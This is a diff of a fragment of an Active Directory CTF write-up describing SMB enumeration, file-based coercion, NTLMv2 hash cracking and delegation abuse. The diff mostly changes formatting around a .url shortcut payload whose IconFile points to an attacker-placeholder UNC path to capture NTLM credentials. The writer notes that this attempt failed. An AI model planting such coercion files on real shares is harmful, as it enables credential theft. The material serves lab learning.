@@ -1,4 +1,4 @@
-## Active Directory CTF Write‑Up ##
+## Active Directory CTF Write‑Up ## 
 This challenge walks through SMB Enumeration -> File-Based Coercion Attack -> Cracking NTLMv2 hash -> abusing AllowedToDelegate privilege to obtain Domain Admin access
 
 # Environment Setup:
@@ -33,11 +33,11 @@ now since i have write access, and the file share hints that svc.scanner service
 
 2. I tried to upload  @test.url file with this syntax:
 
-	`[InternetShortcut]                                                                                                                                           
+	[InternetShortcut]                                                                                                                                           
 	URL=http://thm.loc                                                                                                                                            
 	WorkingDirectory=thm                                                                                                                                          
 	IconFile=\\YOURTUN0IP\icons\icon.ico                                                                                                                          
-	IconIndex=1    `                                                                                                                                              
+	IconIndex=1                                                                                                                                                   
 
 but it didn't trigger authentication
 
